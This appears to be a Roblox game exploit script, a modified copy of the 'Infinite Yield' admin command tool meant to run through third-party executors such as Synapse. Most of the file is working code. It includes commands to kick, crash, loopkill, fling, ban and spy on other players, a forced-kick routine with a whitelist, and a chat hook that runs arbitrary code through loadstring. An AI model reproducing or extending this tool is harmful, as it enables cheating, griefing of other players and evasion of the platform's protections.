--fixed by BLOX_FRUIT01110
do
    local RobloxGui = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
    if RobloxGui and not RobloxGui:FindFirstChild("TopBarContainer") then
        local tbc = Instance.new("Frame")
        tbc.Name = "TopBarContainer"
        tbc.BackgroundTransparency = 1
        tbc.BorderSizePixel = 0
        tbc.Position = UDim2.new(0, 0, 0, 38)
        tbc.Size = UDim2.new(1, 0, 0, 36)
        tbc.ZIndex = 0
        tbc.Parent = RobloxGui
    end
end

local function SafeIsFriendsWith(plr, userId)
    if not plr or not plr.Parent then return false end
    local ok, result = pcall(function() return plr:IsFriendsWith(userId) end)
    return ok and result or false
end

function run()
--script start
---------------------------------------------------------------
---------------------------------------------------------------
--  _____       __ _       _ _        __   ___      _     _  --
-- |_   _|     / _(_)     (_) |       \ \ / (_)    | |   | | --
--   | | _ __ | |_ _ _ __  _| |_ ___   \ V / _  ___| | __| | --
--   | || '_ \|  _| | '_ \| | __/ _ \   \ / | |/ _ \ |/ _` | --
--  _| || | | | | | | | | | | ||  __/   | | | |  __/ | (_| | --
--  \___/_| |_|_| |_|_| |_|_|\__\___|   \_/ |_|\___|_|\__,_| --
--                                                           --
---------------------------------------------------------------
---------------------------Edge-Moon---------------------------
---------------------------------------------------------------

local Version = '9.5.3'
HttpService = game:GetService("HttpService")
SAVEFILE = {
	colorR = 0.121569;
	colorG = 0.121569;
	colorB = 0.121569;
	cmdprefix = ';';
	suggestionstoggle = true;
	allowfriends = true;
	JLnotify = true;
	Mseconds = '7';
	Nfriends = true;
	cmdbarbind = ';';
	chatsV = false;
	whispersV = false;
	commandsV = false;
	aliasSave = {}
}
defaults = HttpService:JSONEncode(SAVEFILE)

function writefileExploit() if is_protosmasher_caller ~= nil or elysianexecute ~= nil or Synapse ~= nil then return true end end

loaded = false
function run()
local function writeF()
writefile("IY.txt", defaults)
wait(1)
local newjson = readfile("IY.txt")
local CREATEFILE = HttpService:JSONDecode(newjson)
colorR = CREATEFILE.colorR
colorG = CREATEFILE.colorG
colorB = CREATEFILE.colorB
cmdprefix = CREATEFILE.cmdprefix
suggestionstoggle = CREATEFILE.suggestionstoggle
allowfriends = CREATEFILE.allowfriends
JLnotify = CREATEFILE.JLnotify
Mseconds = CREATEFILE.Mseconds
Nfriends = CREATEFILE.Nfriends
cmdbarbind = CREATEFILE.cmdbarbind
chatsV = CREATEFILE.chatsV
whispersV = CREATEFILE.whispersV
commandsV = CREATEFILE.commandsV
aliasSave = CREATEFILE.aliasSave
loaded = true end
function pcWRITE()
local file, err = pcall(writeF)
if not file then
warn("READ/WRITE ERROR: "..err)
R_W = game:GetObjects("rbxassetid://01587976911")[1] R_W.Parent = game.CoreGui
function Click(mouse) R_W:Destroy()
for _, child in pairs(game.CoreGui:GetChildren()) do
if child.Name == "IYrun" then
child:Destroy() end end end
R_W.drag.PromptDialog.shadow.Exit.MouseButton1Down:connect(Click) end end
if writefileExploit() then
local function sfile()
local checktxt = readfile("IY.txt")
if checktxt == nil then pcWRITE() writeF()
else return end end
local success, message2 = pcall(sfile)
if success then
local json = readfile("IY.txt")
local LOADFILE = HttpService:JSONDecode(json)
colorR = LOADFILE.colorR
colorG = LOADFILE.colorG
colorB = LOADFILE.colorB
cmdprefix = LOADFILE.cmdprefix
suggestionstoggle = LOADFILE.suggestionstoggle
allowfriends = LOADFILE.allowfriends
JLnotify = LOADFILE.JLnotify
Mseconds = LOADFILE.Mseconds
Nfriends = LOADFILE.Nfriends
cmdbarbind = LOADFILE.cmdbarbind
chatsV = LOADFILE.chatsV
whispersV = LOADFILE.whispersV
commandsV = LOADFILE.commandsV
aliasSave = LOADFILE.aliasSave
loaded = true else
pcWRITE() writeF() end
else
	colorR = 0.121569
	colorG = 0.121569
	colorB = 0.121569
	cmdprefix = ';'
	suggestionstoggle = true
	allowfriends = true
	JLnotify = true
	Mseconds = '7'
	Nfriends = true
	cmdbarbind = ';'
	chatsV = false
	whispersV = false
	commandsV = false
	aliasSave = {}
	loaded = true
end
repeat wait() until loaded == true
local gCoreGui = game:GetService('CoreGui') local gPlayers = game:GetService('Players') local gLighting = game:GetService('Lighting') local Player = gPlayers.LocalPlayer
local Mouse = Player:GetMouse() local char = Player.Character local LP = gPlayers.LocalPlayer local gPlayers = game:GetService("Players") local _players = game:GetService('Players') MSGhook = false local services={} local cmds={}
local std={} local loopkillT = {} local rainbowT = {} local disabletoolsT = {} local banT = {} local adminT = {} function FIND_CHILD(PATH, NAME) if PATH:FindFirstChild(NAME) then return true end return false end
services.events = {} local user = gPlayers.LocalPlayer local bringT = {} agelock = nil isagelocked = false local scriptprefix='\\'
local split=" " slock = false
function updatefile()
if writefileExploit() then
local update = {
	colorR = colorR;
	colorG = colorG;
	colorB = colorB;
	cmdprefix = cmdprefix;
	suggestionstoggle = suggestionstoggle;
	allowfriends = allowfriends;
	JLnotify = JLnotify;
	Mseconds = Mseconds;
	Nfriends = Nfriends;
	cmdbarbind = cmdbarbind;
	chatsV = chatsV;
	whispersV = whispersV;
	commandsV = commandsV;
	aliasSave = aliasSave
}
local updated = HttpService:JSONEncode(update)
wait(0.1)
writefile("IY.txt", updated) end end
function isNumber(str)
return tonumber(str) ~= nil end
function msghook()
for _, child in pairs( workspace:GetChildren()) do
if MSGhook == false and child.ClassName == "Message" and child.Name ~= "IYmessage" then
child.Name = "IYmessage" child.Text = '' MSGhook = true end end
if workspace:FindFirstChild("IYmessage") then MSGhook = true
else MSGhook = false end end
game:GetService("RunService").RenderStepped:Connect(function()
game:GetService("GuiService"):SetGlobalGuiInset(0,72,0,0)
if r15noclip then
if LP.Character:FindFirstChild('Humanoid') then LP.Character.Humanoid:ChangeState(11) end end
if LP.Character and LP.Character:FindFirstChild('Humanoid') then
	LP.Character.Humanoid.Died:connect(function() FLYING = false end)
if MSGhook == true and workspace:FindFirstChild("IYmessage") then
	if workspace.IYmessage.Text == '' then
	for _, child in pairs( LightingService:GetChildren()) do
    	if child.Name == "IYmblur" then
        child:Destroy() end end end
	else MSGhook = false end
	for i,v in pairs(_players:GetPlayers()) do
		if FindTable(loopkillT, v.Name) then
		v.Character:BreakJoints() end
		if FindTable(disabletoolsT, v.Name) and v:FindFirstChild('Backpack') then
		v.Backpack:Destroy()
		for i,n in pairs(v.Character:GetChildren()) do
			if n:IsA('Tool') or n:IsA('HopperBin') then
				n:destroy() end end end
		if FindTable(rainbowT, v.Name) then
			v.Neutral = false
			v.TeamColor = BrickColor.random()
end end end
end)
LightingService = game:GetService("Lighting")
origsettings = {abt = LightingService.Ambient, oabt = LightingService.OutdoorAmbient, brt = LightingService.Brightness, time = 
LightingService.TimeOfDay, fclr = LightingService.FogColor, fe = LightingService.FogEnd, fs = LightingService.FogStart}
function lponly(player) game:GetService('Chat'):Chat(player.Character, 'That is a LocalPlayer only command!', 2) end
function FindTable(Table, Name)
	for i,v in pairs(Table) do
		if v == Name then
			return true
		end end
	return false
end
function GetInTable(Table, Name)
	for i = 1, #Table do
		if Table[i] == Name then
			return i
		end end
return false end
_players.PlayerRemoving:connect(function(player)
for a,b in pairs(injail) do if b == player.Name then table.remove(injail, a) workspace["JAIL_" .. player.Name]:Destroy() end end
for a,b in pairs(hastab) do if b == player.Name then table.remove(hastab, a) workspace[player.Name .. "TAB"]:Destroy() end end
if JLnotify == true and Nfriends == true and SafeIsFriendsWith(player, user.userId) then
			game:FindService('StarterGui'):SetCore('SendNotification', {
				Title = player.Name,
				Text = 'has left the server.\n[AGE: ' ..player.AccountAge.. ']',
				Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]]..player.Name..[[&RAND]] .. math.random(1,100000000),
				Duration = 5,
			})
elseif JLnotify == true and Nfriends == false then
			game:FindService('StarterGui'):SetCore('SendNotification', {
				Title = player.Name,
				Text = 'has left the server.\n[AGE: ' ..player.AccountAge.. ']',
				Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]]..player.Name..[[&RAND]] .. math.random(1,100000000),
				Duration = 5,
			})
end
end)		
FLYING = false
iyflyspeed = 1
function sFLY() -- from rocky2u cmdscript
	repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('HumanoidRootPart') and LP.Character:FindFirstChild('Humanoid')
	repeat wait() until Mouse
	
	local T = LP.Character.HumanoidRootPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = 0
	
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
		repeat wait()
		LP.Character.Humanoid.PlatformStand = true
		if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
		SPEED = 50
		elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
		SPEED = 0
		end
if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
else
BV.velocity = Vector3.new(0, 0.1, 0)
end
	BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			LP.Character.Humanoid.PlatformStand = false
		end)
	end
	Mouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = iyflyspeed
		elseif KEY:lower() == 's' then
			CONTROL.B = -iyflyspeed
		elseif KEY:lower() == 'a' then
			CONTROL.L = -iyflyspeed 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = iyflyspeed
		end
	end)
	Mouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	FLY()
end
function NOFLY()
	FLYING = false
	LP.Character.Humanoid.PlatformStand = false
end
HK = {
	'-HOTKEYS-',
	'HOLD F2 - Click TP',
	'F4 - Toggle Fly',
	'F5 - Toggle Noclip',
	'-COMMANDS-'
}
CMDs = {
	'addalias [cmd] [alias]',
	'addstat [plr] [text]',
	'admins',
	'admin [plr]',
	'agelock [age num]',
	'addban [full username]',
	'age [plr]',
	'aliases',
	'alien / ayylmao [plr]',
	'ambient [R G B]',
	'anchor',
	'animation [plr] [anim]',
	'arrest [plr]',
	'bait',
	'ball [plr]',
	'bang [plr] [plr] / bang [plr]',
	'bans',
	'ban [plr]',
	'base',
	'begone / thot [plr]',
	'bgui [plr] [text]',
	'blackandwhite',
	'bleach [plr]',
	'blackify [plr]',
	'blind [plr]',
	'blur [num]',
	'bomb [plr]',
	'box [plr]',
	'breakloops/break (cmd loops)',
	'brightness [num]',
	'bring [plr]',
	'btools [plr]',
	'burn [plr]',
	'cape [plr] [R G B]',
	'car [plr]',
	'change [plr] [stat] [num]',
	'charplr / cp [plr] [plr]',
	'char [plr] [ID]',
	'chat [plr] [msg]',
	'chickenarms / chicken [plr]',
	'clear',
	'clip',
	'clone [plr]',
	'clraliases',
	'clrbans',
	'clrterrain',
	'cmds',
	'confuse [plr]',
	'control [plr]',
	'copytools / ctools [plr]',
	'countdown [num]',
	'crash [plr]',
	'creeper [plr]',
	'cripple [plr]',
	'crucify [plr]',
	'damage [plr]',
	'dance [plr]',
	'day',
	'decalspam [ID]',
	'deleteclass / dc [class name]',
	'deletepos / dpos [name]',
	'delete [part name]',
	'devuzi',
	'disablereset [plr]',
	'disabletools [plr]',
	'disable [plr]',
	'disco',
	'discomesh [plr]',
	'distortsound / distort [num]',
	'dog [plr]',
	'dong [plr]',
	'draw',
	'duck [plr]',
	'dummy [name]',
	'earthquake [power] [intensity]',
	'enablereset [plr]',
	'enabletools [plr]',
	'enable [plr]',
	'esp [plr]',
	'exit',
	'explode [plr]',
	'explorer / dex',
  'tf / touchfling',
  'utf / untouchfling',
  'remotespy / rspy',
  'cobaltspy / cspy',
	'f3x',
	'face [plr] [ID]',
	'fart [plr]',
	'fat [plr]',
	'fegod',
	'feinvisible / feinvis',
	'fekill [plr] (need a tool)',
	'ff [plr]',
	'filtering',
	'fire [plr] [R G B]',
	'firstp [plr]',
	'fix',
	'fixcam',
	'fixlighting / fixl',
	'flashlight [plr]',
	'fling [plr]',
	'float [plr]',
	'flood',
	'fly',
	'flyspeed [num]',
	'fogcolor [R G B]',
	'fogend [num]',
	'freecam / fc',
	'freecamspeed / fcspeed [num]',
	'freeze / fr [plr]',
	'ghost [plr]',
	'glass [plr]',
	'globalshadows / gshadows',
	'glowstick [plr] [R G B]',
	'god [plr]',
	'goto [plr]',
	'gravity [num]',
	'hang [plr]',
	'hatsize [plr] [num]',
	'hat [plr] [ID]',
	'headshake [plr]',
	'headsize [plr] [num]',
	'heal [plr]',
	'hidename [plr]',
	'hideplaylist / hideplayer',
	'hipheight / hheight [plr] [num]',
	'hub',
	'infect [plr]',
	'insert [ID/name]',
	'invert',
	'invisible / invis [plr]',
	'invisibleff / invisff [plr]',
	'iyspam',
	'jail [plr]',
	'jumppower / jpower [plr] [num]',
	'jump [plr]',
	'keeptools / ktools [plr]',
	'keybind [key] [cmd]',
	'kick [plr]',
	'kidnap [plr]',
	'kill [plr]',
	'knife',
	'knuckles [plr]',
	'light [plr] [R G B]',
	'loadm',
	'loadmap [ID]',
	'loadpos / lpos [plr] [name]',
	'lockws',
	'lock [plr]',
	'logs',
	'longneck [plr]',
	'loopbring [plr]',
	'loopheal [plr]',
	'loopjump / ljump [plr]',
	'loopkill [plr]',
	'loopname / lname [plr]',
	'loopoof',
	'loopsit / lsit [plr]',
	'mage',
	'maxhealth [plr] [num]',
	'maxzoom [plr] [num]',
	'mesh [plr] [mesh] [texture]',
	'message / m [msg]',
	'meteor/asteroid [plr]',
	'naked [plr]',
	'name [plr]',
	'neon [plr]',
	'nextsong',
	'night',
	'nil [plr]',
	'noarms [plr]',
	'nobox [plr]',
	'noclip',
	'noclones [plr]',
	'nodong [plr]',
	'nodummies',
	'noesp [plr]',
	'noglobalshadows / nogshadows',
	'nokeeptools / noktools [plr]',
	'nolimbs [plr]',
	'nooutlines',
	'noparticles [plr]',
	'noplrsound [plr]',
	'norain',
	'notools [plr]',
	'nuke [plr]',
	'os [plr]',
	'offset [plr] [coordinate]',
	'outlines',
	'paper [plr]',
	'partdisco',
	'particles [plr] [ID]',
	'pipetp [plr] [plr]',
	'pitch [num]',
	'playhash / hash [hash]',
	'playlist / player [ID],[ID]...',
	'plrsound [plr] [ID]',
	'positions / pos',
	'prefix [string]',
	'prevsong',
	'punish [plr]',
	'rainbowname [plr]',
	'rainbow [plr]',
	'rain [mesh] [texture]',
	'refresh / re [plr]',
	'rejoin',
	'remotespy',
	'removealias [alias]',
	'removebait / nobait',
	'rgui',
	'removehats / rhats [plr]',
	'removespawns',
	'respawn [plr]',
	'restoremap / rmap',
	'rocket [plr]',
	'savelighting / slighting',
	'savemap / smap',
	'savepos / spos [name]',
	'script [script]',
	'seagull / gull [plr]',
	'seizure [plr]',
	'serverinfo / info',
	'serverlock / slock',
	'servermessage / sm [msg]',
	'sethealth [plr] [num]',
	'setsong [num]',
	'settings',
	'sgod [plr]',
	'shiny [plr]',
	'shrek [plr]',
	'shutdown',
	'sit [plr]',
	'size [plr] [num]',
	'skydive [plr]',
	'skygif [ID],[ID]... [interval]',
	'sky [ID]',
	'smite [plr]',
	'smoke [plr]',
	'sound / music [ID/name]',
	'sparkles / sp [plr] [R G B]',
	'spasm [plr]',
	'spawnpoint [plr]',
	'spectate / view [plr]',
	'speed / ws [plr] [num]',
	'sphere [plr]',
	'spin [plr]',
	'spookyify',
	'starman [plr]',
	'strength [plr]',
	'strobe',
	'stun [plr]',
	'sun [intense] [spread]',
	'sword [plr]',
	'tablet',
	'team [plr] [team]',
	'terrain',
	'thaw / unfr [plr]',
	'thirdp [plr]',
	'time [num]',
	'tools [plr]',
	'torso [plr]',
	'tppos [plr] [coordinate]',
	'tp [plr] [plr]',
	'trail [plr] [R G B]',
	'trip [plr]',
	'unadmin [plr]',
	'unagelock',
	'unanchor',
	'unball [plr]',
	'unban [plr]',
	'unbgui [plr]',
	'unblind [plr]',
	'unblur',
	'uncape [plr]',
	'uncar [plr]',
	'unchar [plr]',
	'unconfuse [plr]',
	'uncreeper [plr]',
	'uncripple [plr]',
	'undecalspam',
	'undisco',
	'undog [plr]',
	'unduck [plr]',
	'unff [plr]',
	'unfire [plr]',
	'unfloat [plr]',
	'unfly',
	'unfreecam / unfc',
	'unghost [plr]',
	'ungod [plr]',
	'unhidename [plr]',
	'uninfect [plr]',
	'unjail [plr]',
	'unkeybind [key]',
	'unlight [plr]',
	'unlockws',
	'unlock [plr]',
	'unlongneck [plr]',
	'unloopbring [plr]',
	'unloopheal [plr]',
	'unloopjump / unljump [plr]',
	'unloopkill [plr]',
	'unloopname / unlname [plr]',
	'unloopoof',
	'unloopsit / unlsit [plr]',
	'unname [plr]',
	'unpartdisco',
	'unpunish [plr]',
	'unrainbowname [plr]',
	'unseizure [plr]',
	'unserverlock / unslock',
	'unshrek [plr]',
	'unskygif',
	'unsmoke [plr]',
	'unsparkles / unsp [plr]',
	'unspectate / unview',
	'unsphere [plr]',
	'unspin [plr]',
	'unstarman [plr]',
	'unstrength [plr]',
	'unstrobe',
	'unstun [plr]',
	'untrail [plr]',
	'unweaken [plr]',
	'version',
	'visible / vis [plr]',
	'volume / vol [num]',
	'weaken [plr]',
	'whiteify [plr]',
	'zinnia [plr]'
}
function updateevents(player) local C = player.Chatted:connect(function(M) if isAdmin(player) then do_exec(M, player) end end) table.insert(services.events, C) end

std.inTable=function(tbl,val)
    if tbl==nil then return false end

    for _,v in pairs(tbl)do
        if v==val then return true end
    end 
	return false
end
std.out=function(str)
    print(str)
end
std.list=function(tbl)
    local str=''
    for i,v in pairs(tbl)do
        str=str..tostring(v)
        if i~=#tbl then str=str..', ' end
    end 
	return str
end
std.endat=function(str,val)
    local z=str:find(val)
    if z then 
		return str:sub(0,z-string.len(val)),true
    else 
		return str,false 
	end
end
std.first=function(str) return str:sub(1,1) end

function isAdmin(name) if FindTable(adminT, name.userId) then return true elseif name.userId == LP.userId then return true end end

local exec=function(str)
    spawn(function()
        local script, loaderr = loadstring(str)
        if not script then
            error(loaderr)
        else
        	script()
		end
    end)
end
local findCmd=function(cmd_name)
    for i,v in pairs(cmds)do
        if v.NAME:lower()==cmd_name:lower() or std.inTable(v.ALIAS,cmd_name:lower())then
            return v
        end
    end
end
local getCmd=function(msg)
    local cmd,hassplit=std.endat(msg:lower(),split)
    if hassplit then 
		return {cmd,true} 
	else 
		return {cmd,false}
	end
end
local getprfx=function(strn)
    if strn:sub(1,string.len(cmdprefix))==cmdprefix then return{'cmd',string.len(cmdprefix)+1}
    elseif strn:sub(1,string.len(scriptprefix))==scriptprefix then return{'exec',string.len(scriptprefix)+1}
    end return
end
function dragGUI(gui)
spawn(function()
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos
local function update(input)
    local delta = input.Position - dragStart
	gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), "InOut", "Quart", 0.04, true, nil) 
end
gui.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = gui.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
gui.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
end)
end
maincolor = Color3.new(colorR, colorG, colorB)
function updatecolors(color)
colorR = maincolor.r colorG = maincolor.g colorB = maincolor.b
maincolor = color
for _, child in pairs( game.CoreGui.RobloxGui:GetChildren()) do
    if child.Name == "TopBarContainer" then
        child.BackgroundColor3 = color
    end end
FeedbackMain.BackgroundColor3 = maincolor
MAIN.BackgroundColor3 = maincolor
bar.BackgroundColor3 = maincolor
game.CoreGui.sugg.suggestions.BackgroundColor3 = color
if game.CoreGui:FindFirstChild('Updates') then
game.CoreGui.Updates.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
game.CoreGui.Updates.drag.PromptDialog.shadow.BackgroundColor3 = color end
if game.CoreGui:FindFirstChild('Sinfo') then
game.CoreGui.Sinfo.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
game.CoreGui.Sinfo.drag.PromptDialog.shadow.BackgroundColor3 = color end
if game.CoreGui:FindFirstChild('cp') then
game.CoreGui.cp.Frame.holder.bar.BackgroundColor3 = color
game.CoreGui.cp.Frame.holder.FeedbackMain.BackgroundColor3 = color 
game.CoreGui.cp.Frame.holder.size.MAIN.BackgroundColor3 = color end
if game.CoreGui:FindFirstChild('Bans') then
game.CoreGui.Bans.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
game.CoreGui.Bans.drag.PromptDialog.shadow.BackgroundColor3 = color end
if game.CoreGui:FindFirstChild('Pos') then
game.CoreGui.Pos.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
game.CoreGui.Pos.drag.PromptDialog.shadow.BackgroundColor3 = color end
if game.CoreGui:FindFirstChild('Admins') then
game.CoreGui.Admins.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
game.CoreGui.Admins.drag.PromptDialog.shadow.BackgroundColor3 = color end
if game.CoreGui:FindFirstChild('Logs') then
game.CoreGui.Logs.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
game.CoreGui.Logs.drag.PromptDialog.shadow.BackgroundColor3 = color end
if game.CoreGui:FindFirstChild('Aliases') then
game.CoreGui.Aliases.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
game.CoreGui.Aliases.drag.PromptDialog.shadow.BackgroundColor3 = color end
for _, child in pairs( game.CoreGui:GetChildren()) do
    if child.Name == "Models" then
        game.CoreGui.Models.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
		game.CoreGui.Models.drag.PromptDialog.shadow.BackgroundColor3 = color
    end
end
for _, child in pairs( game.CoreGui:GetChildren()) do
    if child.Name == "Audios" then
        game.CoreGui.Audios.drag.PromptDialog.ContainerFrame.BackgroundColor3 = color
		game.CoreGui.Audios.drag.PromptDialog.shadow.BackgroundColor3 = color
    end
end
end

function respawn(plr)
local M = Instance.new('Model', workspace) M.Name = 'respawn_iy'
local H = Instance.new('Humanoid', M)
local T = Instance.new('Part', M) T.Name = 'Torso' T.CanCollide = false T.Transparency = 1
plr.Character = M end

local dummy = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://1498924930")
WL = {'IoIman616','Conceptual_Nullifier','Thomasbudge','N3xuI','MoonlightTears','DesiredUsername1233','marie',LP.Name}
function kickF(plr)
spawn(function()
if plr.Parent ~= nil then
if FindTable(WL, plr.Name) then Notify('Error: '..plr.Name..' is whitelisted') else
local newChar = dummy:Clone() newChar.Parent = workspace
newChar.HumanoidRootPart.Position = Vector3.new(math.random(999000, 1001000), 10000, 0)
for i = 1,4 do
local Plat = Instance.new('SkateboardPlatform', newChar)
Plat.Position = newChar.HumanoidRootPart.Position
Plat.Name = 'IYplat'
Plat.Size = Vector3.new(10, 1.2, 10)
Plat.Transparency = 1 end
plr.Character = newChar
local PART = Instance.new('Part', newChar)
PART.CFrame = newChar.HumanoidRootPart.CFrame - Vector3.new(0, 3, 0)
PART.Size = Vector3.new(10, 1.2, 10)
PART.Anchored = true
PART.Transparency = 1
if newChar:FindFirstChild("SkateboardPlatform") then
newChar.SkateboardPlatform.CFrame = newChar.HumanoidRootPart.CFrame end
wait(0.4)
if newChar then newChar:Destroy() end
kickF(plr) end
end end) end

function refresh(plr)
spawn(function()
local rpos = plr.Character.HumanoidRootPart.Position
wait(0.1) plr.Character:Destroy() respawn(plr) wait(0.1)
repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChild('HumanoidRootPart')
plr.Character:MoveTo(rpos) end) end

function getArgs(str) local A = {} local NA = nil local HS = nil local S = str repeat NA, HS = std.endat(S:lower(), split) if NA ~= '' then table.insert(A, NA) S = S:sub(string.len(NA) + string.len(split) + 1) end until not HS return A end
function getCapArgs(str) local A = {} local NA = nil local HS = nil local S = str repeat NA, HS = std.endat(S, split) if NA ~= '' then table.insert(A, NA) S = S:sub(string.len(NA) + string.len(split) + 1) end until not HS return A end
_players.PlayerAdded:connect(function(player)
if JLnotify == true and Nfriends == true and SafeIsFriendsWith(player, user.userId) then
			game:FindService('StarterGui'):SetCore('SendNotification', {
				Title = player.Name,
				Text = 'has joined the server.\n[AGE: ' ..player.AccountAge.. ']',
				Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]]..player.Name..[[&RAND]] .. math.random(1,100000000),
				Duration = 5,
			})
elseif JLnotify == true and Nfriends == false then
			game:FindService('StarterGui'):SetCore('SendNotification', {
				Title = player.Name,
				Text = 'has joined the server.\n[AGE: ' ..player.AccountAge.. ']',
				Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]]..player.Name..[[&RAND]] .. math.random(1,100000000),
				Duration = 5,
			})
end
	if slock == true and allowfriends == false then player.CharacterAdded:connect(function()
	spawn(function()
repeat wait() until player.Character
kickF(player)
	end)
	end)
	end
if slock == true and allowfriends == true and not SafeIsFriendsWith(player, user.userId) then
	spawn(function()
repeat wait() until player.Character
kickF(player)
	end)
	end
if FindTable(banT, player.userId) then
	spawn(function()
repeat wait() until player.Character
Notify('Banned player, ' .. player.Name .. ' attempted to join')
kickF(player)
end)
end
if isagelocked == true and allowfriends == false and player.AccountAge <= agelock then
	spawn(function()
repeat wait() until player.Character
kickF(player)
end)
elseif isagelocked == true and allowfriends == true and not SafeIsFriendsWith(player, user.userId) and player.AccountAge <= agelock then
	spawn(function()
repeat wait() until player.Character
kickF(player)
end)
end
end)
local customAlias = {}
local findCmd=function(cmd_name)
    for i,v in pairs(cmds)do
        if v.NAME:lower()==cmd_name:lower() or std.inTable(v.ALIAS,cmd_name:lower()) then
            return v
        end
    end
    return customAlias[cmd_name:lower()]
end
local function splitString(str,delim)
	local broken = {}
	if delim == nil then delim = "," end
	for w in string.gmatch(str,"[^"..delim.."]+") do
		table.insert(broken,w)
	end
	return broken
end
local historyCount = 0
local cmdHistory = {}
lastBreakTime = 0
local function execCmd(cmdStr,speaker)
    local rawCmdStr = cmdStr
    cmdStr = string.gsub(cmdStr,"\\\\","%%BackSlash%%")
    local commandsToRun = splitString(cmdStr,"\\")
    for i,v in pairs(commandsToRun) do
        v = string.gsub(v,"%%BackSlash%%","\\")
        local x,y,num = v:find("^(%d+)%^")
        local cmdDelay = 0
        if num then
            v = v:sub(y+1)
            local x,y,del = v:find("^([%d%.]+)%^")
            if del then
                v = v:sub(y+1)
                cmdDelay = tonumber(del) or 0
            end
        end
        num = tonumber(num or 1)
        local args = splitString(v,split)
        local cmd = findCmd(args[1])
        if cmd then
            table.remove(args,1)
            cargs = args
            if speaker == gPlayers.LocalPlayer then
                if cmdHistory[1] ~= rawCmdStr then table.insert(cmdHistory,1,rawCmdStr) end
            end
            if #cmdHistory > 20 then table.remove(cmdHistory) end
            local cmdStartTime = tick()
            for rep = 1,num do
                if lastBreakTime > cmdStartTime then break end
                pcall(function()
                    cmd.FUNC(args, speaker)
                end)
                if cmdDelay ~= 0 then wait(cmdDelay) end
            end
        end
    end
end
logsloaded = false
ChatLog = function(plr)
plr.Chatted:Connect(function(Message)
if logsloaded == true then
if whispersV == true and Message:lower():sub(1,2) == '/w' then
CreateLabel(plr.Name,Message)
elseif commandsV == true and isAdmin(plr) and Message:lower():sub(1,1) == cmdprefix then
CreateLabel(plr.Name,Message)
elseif commandsV == true and isAdmin(plr) and Message:lower():sub(1,4) == '/e '..cmdprefix then
CreateLabel(plr.Name,Message)
elseif chatsV == true and Message:lower():sub(1,2) ~= '/e' and Message:lower():sub(1,2) ~= '/w' and Message:lower():sub(1,1) ~= cmdprefix then 
CreateLabel(plr.Name,Message)
end end end) end
function do_exec(str, plr) if not isAdmin(plr) then return end str = str:gsub('/e ', '') local t = getprfx(str) if not t then return end str = str:sub(t[2]) if t[1]=='exec' then exec(str) elseif t[1]=='cmd' then execCmd(str, plr) end end
